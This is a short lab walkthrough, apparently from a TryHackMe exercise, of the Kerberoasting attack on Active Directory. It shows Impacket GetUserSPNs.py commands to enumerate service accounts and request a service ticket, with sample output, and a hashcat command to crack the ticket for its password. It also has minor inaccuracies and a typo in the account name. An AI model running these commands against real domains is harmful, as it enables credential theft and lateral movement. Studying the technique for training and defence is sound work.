**Kerberoasting**

Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to **SPN (Service Principal Name)** accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (**TGT**) and Ticket Granting Service (**TGS**). This attack's end goal is to enable privilege escalation and lateral network movement.

Let's do a quick demo about the attack. First, we need to find an SPN account(s) using ```GetUserSPNs.py``` script:
```
GetUserSPNs.py -dc-ip <DomainController_IP> <domain>/<username>
```
**ex**:
```
GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
```
We see a service running and ```svc-user``` is the user running it.<br>
we can send a request to get a **TGS** ticket for the ```srv-user``` user using the ```-request-user``` argument:
```
GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm -request-user svc-user
```
**Crack the TGS**

If we got the sevice TGS we could crack it to dump the password using ```hashcat```

```
hashcat -m 13100 hashes.txt /path/to/wordlist.txt
```






























